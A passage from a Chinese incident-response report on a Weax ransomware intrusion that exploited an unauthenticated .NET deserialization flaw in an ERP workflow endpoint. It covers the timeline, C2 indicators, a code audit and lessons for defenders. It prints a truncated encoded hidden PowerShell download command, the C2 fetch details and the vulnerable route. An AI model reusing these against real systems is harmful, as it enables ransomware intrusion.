---
title: 【先知】【勒索预警】警惕！Weax勒索病毒改用国内IP发起0day攻击，某地产ERP遭加密，完整溯源复盘（附IOC）
source: https://xz.aliyun.com/news/93031
source_host: xz.aliyun.com
clip_date: 2026-10-28T08:20:55+08:00
trace_id: cff00778-ecff-4272-82de-baa0bfcd773b
content_hash: 0e40f8e3d455315ca31397f8a81981f9cc250dfdcef0dad3cdd8ea1a81575a07
status: synced
tags:
  - 先知
  - 勒索软件
  - 漏洞分析
series: null
feed_source: 先知安全技术社区
ai_summary: TL;DR：Weax勒索家族改用国内代理池IP，利用某地产ERP工作流站GetDictResult免认证.NET反序列化0day，不到三小时完成从试探到加密勒索的完整闭环。
ai_summary_style: key-points
images_status:
  total: 50
  succeeded: 50
  failed_urls: []
notion_page_id: 40775244-d011-818b-b9fe-f5af41ad4665
ioc:
  cves: []
  cwes: []
  hashes:
    - 2ff6cb463ae9d976f42874b4f7c92852eda1c74e9fe5fc30dc10c02b5ea17d64
    - e2066dfb3dabfa01be6341cc324b1c4b
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：Weax勒索家族改用国内代理池IP，利用某地产ERP工作流站GetDictResult免认证.NET反序列化0day，不到三小时完成从试探到加密勒索的完整闭环。
> 
> - **攻击时间线：** 2026年8月13日16:32起，攻击者（浙江杭州36.137.66.*、36.134.184.*代理池）四次探测利用9010端口工作流站GetDictResult接口：前两次借助SQLPS.exe -nop -w hidden -enc拉取加密器均被Defender查杀（Trojan:Win32/Commando.A!ml）仍不停止；第四次通过ScriptBlock日志记录发现其用VirtualAlloc+GetProcAddress内存注入shellcode，19:04加密器DrUeCKfgv.exe落地执行并批量清除系统日志，全程约2.5小时。
> - **漏洞根源（代码审计确认）：** 该ERP路由对无[Action]特性的public方法默认放行，GetDictResult无CheckLogin/Authorize校验致免认证可达；参数绑定使用Json.NET且TypeNameHandling.All，攻击者通过JSON $type字段实例化任意.NET类型实现反序列化RCE，三层防护（关键字检查等）均未覆盖该无扩展名路由。
> - **C2基础设施：** 加密器从154.213.231.177:10593（香港，动力线有限公司）拉取，关联未备案域名9v5eqfc.cn（注册商成都垦派科技，注册邮箱dunkdd631@gmail.com）；加密器SHA256为2ff6cb46...ea17d64。
> - **关键手法与防守启示：** SQLPS.exe被选作PowerShell宿主是为规避powershell.exe监控及借SYSTEM/SQL服务身份伪装；改用国内代理池是为绕过境外IP封禁与情报信誉策略——"告警未处置否则等于无告警"（本案Defender两次拦截成功仍被绕过），封禁境外IP策略已不足以应对"借道国内打国内"。
> - **溯源经验：** WEB日志IIS默认UTC需+8换算对照事件日志；日志被清除后仍可依赖Defender记录、ScriptBlock日志、IIS访问日志、文件时间戳与applicationHost.config修改时间交叉补齐时间线；应急进场先确认现场已做处置（本案厂商已提前以denyUrlSequences封堵漏洞路由）。

## 写在前面

近期，公安部网安局在护网专项工作中发布提醒文章，文中明确点名Sorry、Weax两个勒索家族近期攻击十分活跃，制造、商贸、医疗、教育、科技等行业的企业接连中招。作为长期奋战在一线的应急响应团队，我们对这个提醒的感受比大多数人都要直接，因为我们就身处这些案例的现场。

Solar应急响应团队一直在持续跟进Weaxor勒索家族（Rox、Weax、Roxeaw）的攻击事件。六月底，我们发布了Weaxor与TellYouThePass两大家族借管家婆软件攻击国内中小企业的全链路复盘。通过近几个月的分析，可以观察到该家族的明显变化，其突破口正在从HW期间曝光的1day、Nday漏洞转向真正的0day攻击，且漏洞武器化的速度显著加快，从软件公开可获取到漏洞投入实战的周期被压缩得极短。结合攻击基建的搭建方式与作案流程的熟练程度，基本可以确定有AI参与了前期攻击基建平台的搭建，其攻击手法与国内红队或专业安全人员高度相似。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/64710a3522c1a2c8.png)

solar平台Weaxor勒索家族特征查询，标注家族名称、加密后缀、勒索信样式等关键字段

截至目前，我们已经处置了多起0day攻击导致的勒索事件，相关案例的全流程复盘会在本账号陆续更新，感兴趣的读者可以点个关注，第一时间获取后续内容。

**阅读说明**

按照惯例，本文对受害企业名称、受害资产地址及ERP厂商名称做脱敏处理，涉及厂商标识的文件路径与命名空间已做部分遮蔽，配图中的敏感信息也已打码。下文将完整展示本次事件的溯源路径、代码审计过程与攻击闭环。需要提前说明的是，真实的溯源过程远没有文章呈现的这样顺利，我们在文末整理了处置过程中遇到的几个问题，供同行参考。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e9019d6a17bd91e1.png)

相关ERP在资产测绘平台通过指纹统计数量

## 一、攻击时间线还原

### 1.1 时区换算说明

被攻击的WEB应用日志使用UTC时区，Windows系统日志使用UTC+8本地时间。下文凡涉及WEB日志与系统日志对照之处，均按"WEB日志UTC时间加8小时等于本地时间"进行换算。以受害主站为例，页面时间与服务器本地时间相差8小时。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e9e4bfd1077fa277.png)

受害主站页面与服务器本地时间对照，WEB应用时区为UTC，与系统本地时间（UTC+8）相差8小时

### 1.2 初次存活试探（16:32:32，36.137.66.81）

2026年8月13日 16:32:32（本地时间，对应WEB日志UTC时间08:32:32），攻击者IP 36.137.66.81初次访问受害服务器9010端口工作流站进行存活试探。由于该ERP的认证机制，未登录请求被自动302跳转至9000端口主站登录页。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7ab040facf9494c0.png)

9010工作流站WEB访问日志，36.137.66.81初次访问，返回302跳转

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5ed8f7c4126c082c.png)

威胁情报平台查询结果，36.137.66.81（中国 浙江杭州）

### 1.3 首次漏洞利用，SQLPS.exe拉取加密器被Defender拦截（18:29:49，36.137.66.70）

2026年8月13日 18:29:49（本地时间，对应WEB日志UTC时间10:29:49），攻击者IP 36.137.66.70以POST方式请求 /wf/appservice/BusinessObjectService/GetDictResult，响应时延2.78秒，明显长于正常业务请求，符合命令执行类载荷的响应特征。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9645ca1605eb6b5e.png)

9010工作流站WEB访问日志，36.137.66.70 POST GetDictResult，时延2.78秒

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8c8293565d5913a4.png)

威胁情报平台查询结果，36.137.66.70（中国 浙江杭州）

与本次请求相对应，系统日志显示Windows Defender于2026年8月13日 18:29:48拦截并查杀了攻击者发起的恶意命令。攻击者调用 C:\\Program Files (x86)\\Microsoft SQL Server\\150\\Tools\\Binn\\SQLPS.exe，以 -nop -w hidden -enc 方式运行加密命令，从远程服务器拉取加密器。Defender将其识别为 Trojan:Win32/Commando.A!ml，查杀时进程运行身份为 NT AUTHORITY\\SYSTEM。

相关特征（Defender查杀日志原文，加密命令行过长，此处截断）：

```plain
Microsoft Defender 防病毒 检测到恶意软件或其他可能不需要的软件。
         名称: Trojan:Win32/Commando.A!ml
         ID: 2147840094
         严重性: 严重
         类别: 特洛伊木马
         路径: CmdLine:_C:\Program Files (x86)\Microsoft SQL Server\150\Tools\Binn\SQLPS.exe -nop -w hidden -enc RgB1AE4AYwB0AEkAbwBOACAAcQBIAHoAKAAkAHsAVQBoAH0ALAAkAHsARQBYAH0AKQB7AEYAbwBSACgAJABOAD0AMAA7ACQATgAgAC0AbAB0ACAAJAB7AFUAaAB9AC4AYwBvAHUATgB0ADsAJABOACsAKwApAHsAJAB7AFUAaAB9AFsAJABOAF0APQAoACQAewBVAGgAfQBbACQATgBdAC0AYgBYAG8AUgAkAHsARQBYAH0AKQB9AFIARQB0AHUAUgBOACAAWwBzAFkAcwB0AEUATQAuAHQARQBYAHQALgBFAE4AYwBvAGQASQBOAGcAXQA6ADoAYQBzAGMASQBJAC4AZwBFAHQAcwB0AFIASQBOAGcAKAAkAHsAVQBoAH0AKQB9ADsAJAB7AFoAUwBXAFAAfQA9ACgAJgBxAEgAegAoAFsAcwBZAHMAdABFAE0ALgBiAFkAdABFAFsAXQBdAEAAKAAwAHgANgAyACwAMAB4ADYARQAsADAAeAA3ADMALAAwAHgAQgAsADAAeAAzACwAMAAwAHgAMwA...（后略）
         用户: NT AUTHORITY\SYSTEM
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/edb26081d201b703.png)

Windows Defender查杀事件详情（2026年8月13日 18:29:48，Trojan:Win32/Commando.A!ml，用户NT AUTHORITY\\SYSTEM）

### 1.4 第二次漏洞利用，再次调用SQLPS.exe（18:41:52，36.137.66.31）

2026年8月13日 18:41:52（本地时间，对应WEB日志UTC时间10:41:52），攻击者IP 36.137.66.31再次以POST方式请求GetDictResult接口，时延0.534秒。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/00ee8e90a2ee3676.png)

9010工作流站WEB访问日志，36.137.66.31 POST GetDictResult，时延0.534秒

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9d827c46e7c99d05.png)

威胁情报平台查询结果，36.137.66.31（中国 浙江杭州）

与本次请求相对应，系统日志显示Windows Defender于18:41:52再次查杀同类恶意命令，威胁名称、查杀特征与第一次完全一致。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d4ba290ce6b64771.png)

Windows Defender第二次查杀事件详情（2026年8月13日 18:41:52，特征与首次一致）

这里值得防守方警惕。Defender连续两次查杀成功，但攻击并未停止，攻击者只是换了一种执行方式继续推进。告警被拦截不等于攻击被终结，如果两次高危查杀记录能在当时被运营人员看到并处置，后面的加密大概率可以避免。

### 1.5 第三次漏洞利用，创建PowerShell控制台（18:46:00，36.137.66.31）

2026年8月13日 18:46:00（本地时间，对应WEB日志UTC时间10:46:00），攻击者IP 36.137.66.31再次POST请求GetDictResult接口，时延0.055秒。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2a150b221b32a64e.png)

9010工作流站WEB访问日志，36.137.66.31 POST GetDictResult，时延0.055秒

与本次请求相对应，系统日志显示18:46:00通过会话创建了PowerShell控制台（进程PID 27824）。日志原文如下。

```plain
Windows PowerShell 已在 AppDomain: DefaultAppDomain 中的进程: 27824 上启动 IPC 侦听线程。
Powershell 控制台已准备好用于用户输入
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/bd12dafc277fa194.png)

PowerShell控制台启动事件（2026年8月13日 18:46:00，进程PID 27824）

### 1.6 第四次漏洞利用，注入ScriptBlock脚本内存加载远控载荷（19:03:33，36.137.66.108）

2026年8月13日 19:03:33（本地时间，对应WEB日志UTC时间11:03:33），攻击者IP 36.137.66.108再次POST请求GetDictResult接口，时延0.049秒。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/93171d406bb76049.png)

9010工作流站WEB访问日志，36.137.66.108 POST GetDictResult，时延0.049秒

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/60814d2b0669e997.png)

威胁情报平台查询结果：36.137.66.108（中国 浙江杭州）

与本次请求相对应，系统日志显示19:03:34至19:03:36通过会话创建了PowerShell控制台（进程PID 20452），并先后写入两段ScriptBlock脚本。第一段为多层混淆的PowerShell加载器，采用字符串拼接混淆加Base64解码加位移运算的组合手法。第二段通过GetProcAddress反射调用VirtualAlloc分配内存并执行shellcode，属于经典的内存注入手法。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6f41b0b72be49f07.png)

ScriptBlock日志记录事件（2026年8月13日 19:03:34，进程PID 20452）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d81018c87616b2e4.png)

第一段ScriptBlock内容，字符串拼接混淆加Base64解码加位移运算的PowerShell加载器

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d9368236e4124279.png)

第二段ScriptBlock内容，通过GetProcAddress与VirtualAlloc在内存中执行shellcode

经过分析，该脚本通过加密方式在内存中执行，功能为从远程C2服务器拉取加密器并在本地运行。以下为从脚本中还原的当时拉取加密器的C2地址（相关端口现已关闭）。

|     |     |
| --- | --- | 
| **类型** | **值** |
| C2 IP | 154.213.231.177 |
| 端口  | 10593（0x2961） |
| 请求URI | /User/get/Server/v7.90/apiv3/YLC1BO055GV |
| User-Agent | Mozilla/5.0 (Windows NT 6.1; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0 |
| 请求头 | Accept: application/xml, image/\*；Accept-Encoding: br, identity |
| URI后48字节随机数据 | Meterpreter stage UUID与RSA公钥哈希（攻击者基础设施指纹） |

### 1.7 加密器落地执行，批量清除系统日志（19:04:08）

2026年8月13日 19:04:08，攻击者通过上述脚本自C2拉取加密器成功，加密器落地 C:\\Windows\\System32\\DrUeCKfgv.exe 并执行。自19:04:08起，加密器开始批量清除Windows系统日志，破坏现场，对抗溯源。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5c5989c0f636a021.png)

系统日志清除事件记录，2026年8月13日 19:04:08起Windows事件日志被批量清除

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1ee065eab4ad3311.png)

文件列表显示，开始加密时间为2026年8月13日 19:04

### 1.8 收尾确认请求，应用已崩溃（19:08:59，36.134.184.90）

2026年8月13日 19:08:59（本地时间，对应WEB日志UTC时间11:08:59），攻击者IP 36.134.184.90再次POST请求GetDictResult接口，时延2.796秒。此时应用数据已被加密器加密，站点处于崩溃状态，该请求应为攻击者对加密结果的收尾确认。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1123f9bf5b1851ae.png)

9010工作流站WEB访问日志，36.134.184.90 POST GetDictResult，时延2.796秒（应用已崩溃）

经威胁情报查询，36.134.184.90在近期对互联网资产进行了大范围漏洞攻击。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0ee32e1f3b21328b.png)

威胁情报平台查询结果：36.134.184.90（中国 浙江杭州，存在大范围漏洞攻击记录）

### 1.9 攻击时间线总览

|     |     |     |
| --- | --- | --- |  
| **时间（2026年8月13日，UTC+8）** | **攻击者IP** | **动作** |
| 16:32:32 | 36.137.66.81 | 存活试探，302跳转登录页 |
| 18:29:49 | 36.137.66.70 | 首次利用，SQLPS.exe拉取加密器被Defender查杀 |
| 18:41:52 | 36.137.66.31 | 第二次利用，再次被Defender查杀 |
| 18:46:00 | 36.137.66.31 | 第三次利用，创建PowerShell控制台 |
| 19:03:33 | 36.137.66.108 | 第四次利用，注入ScriptBlock内存加载远控载荷 |
| 19:04:08 | （加密器执行阶段） | 加密器DrUeCKfgv.exe落地执行，批量清除系统日志 |
| 19:08:59 | 36.134.184.90 | 收尾确认请求，应用已崩溃 |
| 19:12:35 | 36.137.66.249 | 主站请求返回500，站点崩溃 |

从初次试探到加密完成，全程不到三个小时，期间经历两次查杀拦截仍未中断。作案节奏干净利落，攻击者对整套流程已经非常熟练。

## 二、C2与域名基础设施分析

威胁情报平台将C2地址154.213.231.177标注为中国香港，归属动力线（香港）有限公司。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7ff99a1b366f3d50.png)

威胁情报平台查询结果，C2 IP 154.213.231.177（中国香港，动力线（香港）有限公司）

该C2同时关联解析域名 0adma9.9v5eqfc.cn、d3wxqn41twwyg6n7.0adma9.9v5eqfc.cn 等，均为主域名 9v5eqfc.cn 的子域名，该主域名未备案。经查询，域名注册商为成都垦派科技有限公司，域名注册邮箱为 [dunkdd631@gmail.com](mailto:dunkdd631@gmail.com) 。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/37aeafb0d15c1433.png)

威胁情报平台查询结果，域名9v5eqfc.cn及其子域名解析记录

经工商信息查询，成都垦派科技有限公司的主营业务即为域名注册。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f9ae92612abbe559.png)

成都垦派科技有限公司工商信息（主营业务包含域名注册服务，官网kenpai.com）

## 三、主站（9000端口）同步探测情况

在其它站点的WEB日志中，同样发现攻击者使用同一POC进行测试，目标为受害服务器9000端口主站。主站在未登录状态下对任意URL均返回302跳转登录页，攻击未能深入。逐条记录如下。

2026年8月13日 18:35:53（本地时间），IP 36.137.66.114以POST方式请求主站GetDictResult路径，时延0.036秒，返回302。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3b594fb08410ebdd.png)

9000主站WEB访问日志，36.137.66.114 POST GetDictResult（302跳转登录页）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2fbeb6dc29e3e485.png)

威胁情报平台查询结果：36.137.66.114（中国 浙江杭州）

2026年8月13日 18:42:17（本地时间），IP 36.137.66.108以POST方式请求主站GetDictResult路径，时延0.036秒，返回302。该IP曾于19:03:33对9010端口工作流站发起攻击并成功写入ScriptBlock（见本文1.6节），两处日志可相互印证。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/545e927d08a08d0d.png)

9000主站WEB访问日志，36.137.66.108 POST GetDictResult（302跳转登录页）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7bcf5d6ed83ee55d.png)

36.137.66.108对9010工作流站的攻击日志（同图12，此处引用以作跨端口对照）

2026年8月13日 18:46:25（本地时间），IP 36.137.66.245以POST方式请求主站GetDictResult路径，时延0.037秒，返回302。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6b3bfd2ffbcce134.png)

9000主站WEB访问日志，36.137.66.245 POST GetDictResult（302跳转登录页）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8b2e50587184b35d.png)

威胁情报平台查询结果，36.137.66.245（中国 浙江杭州）

2026年8月13日 19:12:35（本地时间），IP 36.137.66.249以POST方式请求主站GetDictResult路径，时延27.412秒，返回500，此时主站数据及源码已被加密，站点崩溃。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4296fde3db314a83.png)

9000主站WEB访问日志，36.137.66.249 POST GetDictResult（500错误，时延27.412秒，站点已崩溃）

综合以上日志可以推断，攻击者疑似使用浙江杭州代理池IP段 36.137.66.\* 与 36.134.184.\*，对全网该ERP资产利用攻击载荷进行扫描。由于该ERP对外开放多个功能端口，且工作流站端口（本案为9010）并不固定，攻击者只能逐一扫描试探，在确认某目标的GetDictResult接口对攻击载荷有正确响应后，再通过加密命令从 154.213.231.177:10593 拉取加密器，对文件数据进行加密。

## 四、代码审计，漏洞为什么成立

### 4.1 审计前置，确认站点根目录

通过IIS站点配置确认，9010端口工作流站的物理根目录为 D:\\Mt\\MtWorkFlow60（厂商标识已遮蔽）。以下对攻击者载荷所触发的漏洞点进行代码审计。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ef06982fdebc074c.png)

IIS站点配置，9010端口工作流站物理路径指向厂商工作流安装目录

### 4.2 审计步骤1，路由入口，无扩展名URL进入.NET管线

路径导航为 web.config 的 system.webServer/handlers 节，关键配置位于第287行与第342行。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/fd90559b3c51a0ac.png)

web.config第287行，MyWF.Extensions.ServiceHandlerFactory 处理器注册

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8c40b87df07947ef.png)

web.config第342行，/wf/路径的处理器映射（ServiceHandlerFactory）

审计发现1：/wf/appservice/BusinessObjectService/GetDictResult 无文件扩展名，由 ServiceHandlerFactory 接管处理，请求由此进入ASP.NET管线。

### 4.3 审计步骤2，URL解析正则

路径导航至 MyWF.Extensions.dll的 UrlParser 类，关键代码如下。

```plain
internal static readonly Regex ServiceUrlRegex = new Regex(
    "/(?<type>\\w+)/((?<namespace>[\\.\\w-]+)[/\\.])?(?<name>\\w+)/(?<method>\\w+)(?<extname>\\.[a-zA-Z]+)?",
    RegexOptions.Compiled);
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b3457c76c8440769.png)

UrlParser类中ServiceUrlRegex正则的定义位置

审计发现2：URL被解析为 type=wf、namespace=appservice、name=BusinessObjectService、method=GetDictResult，扩展名为可选项。

### 4.4 审计步骤3，类定位，NamespaceMap映射

路径导航的第一跳是程序集特性。AssemblyInfo.cs中的NamespaceMap特性将程序集映射为URL命名空间AppService。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/1263b1993d197184.png)

AssemblyInfo中的NamespaceMap特性，将程序集映射为URL命名空间AppService

第二跳是ControllerRecognizer.cs，根据URL前缀拼接命名空间与类名，定位服务类全名。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/75a9de964ed90050.png)

ControllerRecognizer，根据URL前缀拼接命名空间与类名，定位服务类全名

第三跳是ControllerResolver.cs的ActionIsMatch方法，无\[Action\]特性的方法默认放行，myAttribute为null时直接return true。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2b9b9840305f6882.png)

ActionIsMatch反编译代码，方法未标注\[Action\]特性时直接返回true（默认放行）

第四跳是etadataCache.cs，ActionFindBindingFlags取值为 Instance | Static | Public。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3f0e41d71a22dece.png)

MetadataCache，方法查找范围BindingFlags限定为Instance、Static、Public

最终定位至 BusinessObjectService.GetDictResult。public方法加上无特性约束，即可被路由直接调用。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c9eed4b484a774bf.png)

BusinessObjectService类中GetDictResult方法的最终定位

审计发现3：路由机制对无\[Action\]特性的public方法默认放行，且反射查找范围覆盖全部public实例与静态方法，GetDictResult因此成为可通过URL直接触达的入口方法。

### 4.5 审计步骤4，漏洞入口方法免认证可达

路径导航至 BusinessObjectService 的 GetDictResult 方法体。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c9139b2801e9e527.png)

GetDictResult方法体反编译代码，无任何登录态校验

审计发现4：漏洞成立的第一半。方法声明为public virtual，可被路由反射调用。方法体内无CheckLogin()调用，类上无\[Authorize\]，方法上无\[WFVerifyRight\]。对比同文件其余数十个方法，几乎全部显式调用CheckLogin()，业务调用方有认证，作为辅助方法的GetDictResult没有，属漏网之鱼。方法体内不含任何SQL，这解释了为什么IIS日志中只见200状态码而不见SQL注入特征，漏洞利用发生在参数绑定阶段，早于方法体执行。

### 4.6 审计步骤5，参数绑定，TypeNameHandling.All（漏洞核心）

路径导航的第一跳是 ActionParametersProviderFactory.cs，按Content-Type选择参数反序列化器，application/json走CreateJsonProvider。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/32d104ea96ec7a18.png)

ActionParametersProviderFactory，按Content-Type选择参数反序列化器，application/json走CreateJsonProvider

第二跳跟进CreateJsonProvider，进入JsonnetDataProvider.cs。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/78e9f5ba884b5a49.png)

JsonnetDataProvider，DefaultJsonSerializerSettings中TypeNameHandling等于All，GetDictResult为单参数，整个请求body被一次性反序列化

审计发现5：漏洞成立的第二半。攻击者完整控制JSON请求体。TypeNameHandling.All使字典值上的$type字段被服务端解析并实例化为任意类型。Dictionary<string, object>的value类型为object，正是$type生效的位置。同款配置在/api/框架的JsonnetDataProvider.cs第17行中同样存在。

### 4.7 审计步骤6，防护绕过分析，三层防护全部失效

路径导航至 Mysoft.Map.Core.dll的 WebSecurity 静态构造函数。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e4d977db11f27834.png)

WebSecurity静态构造函数，SQL关键字检查仅覆盖.aspx、.ashx、.ajax扩展名，/wf/无扩展名路径不在检查范围内

审计发现6：三层防护层层落空，攻击载荷自进入参数绑定到完成反序列化实例化，全程未受任何拦截。

## 五、POC验证与攻击闭环

回读方式为 GET http://<目标>:9010/poc_ok.txt，返回 nt authority\\network service。

工具实测，确认免认证可达与TypeNameHandling.All生效，systeminfo命令回显（主机名已脱敏，Windows Server 2019 Datacenter，云主机）

工具实测，whoami /priv回显，当前身份nt authority\\network service，持有已启用的SeImpersonatePrivilege特权

至此，攻击路径全部闭环。攻击者利用该ERP工作流站GetDictResult未授权反序列化漏洞执行系统命令，进而执行加密器完成加密。

## 六、攻击者为何选择数据库程序SQLPS.exe拉取加密器

事实前提均已验证。w3wp工作进程为NETWORK SERVICE身份，令牌含已启用的SeImpersonatePrivilege。服务器装有SQL Server 2019，SQLPS.exe路径固定存在。Defender报告显示SQLPS运行身份为NT AUTHORITY\\SYSTEM。SQL Server服务账号为NT Service\\MSSQLSERVER，并非SYSTEM。ERRORLOG（审核策略为仅失败）在攻击时段无sp_configure与xp_cmdshell开关记录，且8月13日 06:09之后再无任何记录。

选择SQLPS.exe的理由如下：

第一：规避针对powershell.exe的检测。企业侧PowerShell监控（命令行审计规则、进程名告警、运维人工排查）绝大多数以powershell.exe为目标。SQLPS.exe是SQL Server自带的备用PowerShell宿主，同样基于System.Management.Automation引擎，支持 -nop -w hidden -enc 参数，不在常见告警名单内。本次Defender也是依靠机器学习模型检出（威胁名带!ml后缀），而非进程名规则命中。

第二：环境伪装。在数据库服务器上，"SQL工具运行PowerShell"对任何快速浏览进程列表的分析者都显得正常，进程名本身就是保护色。

第三：SYSTEM身份的来源与SQL无关。NT Service\\MSSQLSERVER不是SYSTEM。若SQLPS经xp_cmdshell拉起，其运行身份应为SQL服务账号而非SYSTEM。Defender报告的SYSTEM身份与xp_cmdshell路线矛盾，而与"Web层提权后直接执行"的路线吻合。

## 七、溯源过程中遇到的问题

正如开头所说，本次溯源远没有文章呈现的这样顺利。以下问题整理出来供同行参考，问题用引用块标出，后面是我们的分析与想法。

### 问题一 排查方向并非一开始就指向反序列化

在事件日志中，我们先发现的是攻击者调用SQL相关程序，一开始认为是SQL注入，因为无论怎么看都像是使用xp_cmdshell进行攻击的。攻击者为什么会在一个反序列化漏洞的场景里调用SQL程序？

我们的分析是这样的。结合对外映射端口以及数据库errlog排查后发现，数据库端口并未对外开放，SQL注入的路在入口侧就不成立。转而排查WEB相关日志及源码，发现相关路由中并无SQL查询点，进一步审计才确认存在确凿的反序列化攻击点。至于攻击者为什么调用SQL程序，第六节的结论可以解释，SQLPS.exe被选中是为了规避针对powershell.exe的检测，同时借数据库进程的身份做伪装。除此之外也不排除攻击者有意留下误导性痕迹，诱导溯源人员往SQL注入方向排查，拖延定位真实漏洞点的时间。这起案例给我们的提醒是，看到SQL程序被调用不等于攻击入口就是SQL注入，进程层面的证据要与入口层面的证据分开看。

### 问题二 WEB日志的时差问题

在溯源的过程中，WEB日志与事件日志的时间始终无法对应，排查一度陷入混乱。

原因在于IIS日志默认使用UTC时间，与本地事件日志对照时需要按UTC+8换算，这属于基础知识点，但在高压的应急现场很容易被忽略，一旦忽略，所有基于时间线的交叉印证都会错位。建议同行在进场取证的第一步就确认各日志源的时区设置。

### 问题三 现场信息同步不及时

在后续漏洞复现时，攻击载荷发送出去以后页面直接返回404，不管怎么调整都复现不了。

排查applicationHost.config后发现，被攻击的路由已被加入denyUrlSequences拒绝序列。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e02974dd3e55138f.png)

applicationHost.config检索结果，服务器级denyUrlSequences中已加入 /wf/appservice/BusinessObjectService/GetDictResult 路径

回溯该配置文件，其最后修改时间为2026年8月14日 08:40，即勒索事件发生后的次日早上。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/33e13c6942d9c5cd.png)

服务器取证，applicationHost.config最后修改时间为2026年8月14日 08:40，inetsrv\\Config目录留存有历史配置备份

查询当日登录日志确认，IP 120.192.*.*（山东济南）于2026年8月14日 08:39:20远程登录服务器成功（管理员账号）。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c91eb4e05e8ec313.png)

远程桌面登录日志，2026年8月14日 08:39:20，来源IP 120.192.*.*（山东济南），管理员用户

经与该ERP官方运维人员核实，对方告知8月13日晚间发现服务器异常，13日夜间至14日凌晨开展紧急排查，14日早上实施了应急处理，处理内容即为配置上述URL拒绝序列，相当于对漏洞做了临时修复。

这一处置本身没有问题，问题在于没有同步给我们。信息同步不及时，直接导致大量时间浪费在核实一条已经被封死的路由上。建议应急进场后的第一项确认工作，就是问清楚在我们接手之前，现场已经做过哪些处置动作。

### 问题四 攻击者为什么要用国内代理IP

该家族以往均使用海外IP发起攻击，从本案开始改用国内代理池IP，有些人可能会觉得这太狂了，攻击者的动机是什么？

经过进一步核实，相关IP均为代理池IP。我们判断最大的可能原因有以下几点。

第一：越来越多的企业在边界设备和云WAF上启用了境外IP封禁或地域访问控制，该家族以往惯用的海外IP根本打不进来，改用国内IP是最直接的绕过方式。

第二：国内代理池IP在威胁情报库中大多标记干净，信誉评分高，可以绕过基于情报的封禁策略。

第三：代理池按量计费、秒级更换，即便单个IP被加黑也能立刻切换，防守方的封禁成本被大幅抬高。

第四：国内到国内的访问延迟低、链路稳定，漏洞利用的成功率更高。

第五：代理池切断了攻击者的真实出口，溯源只能看到代理节点，归因和取证难度显著增加。这种"借道国内打国内"的变化值得所有防守方警惕，单纯封禁境外IP的策略已经不够用了。

**问题五 日志被批量清除后的取证窗口**

加密器落地后立即批量清除系统日志，现场取证面临日志断档，时间线还能不能还原？

